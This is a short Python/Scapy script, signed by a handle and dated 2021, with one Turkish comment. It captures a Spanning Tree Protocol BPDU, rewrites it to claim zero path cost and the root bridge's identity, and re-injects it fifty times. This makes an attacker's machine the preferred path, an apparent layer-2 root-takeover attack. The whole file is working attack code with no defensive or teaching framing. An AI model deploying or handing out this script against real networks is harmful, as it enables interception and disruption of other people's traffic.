# @daddydemir
# 30.07.2021 - Friday 

from scapy.all import * 

pkt = sniff(filter="ether dst 01:80:c2:00:00:00" , count=1)

pkt[0].pathcost = 0 
# yol maliyeti 0'a atanıyor ki istemci bu yolu seçsin . 

pkt[0].bridgemac = pkt[0].rootmac 

pkt[0].portid = 1

for i in range(0,50):
  pkt[0].show()
  sendp(pkt[0] , loop=0 , verbose=1)
  time.sleep(1)
  
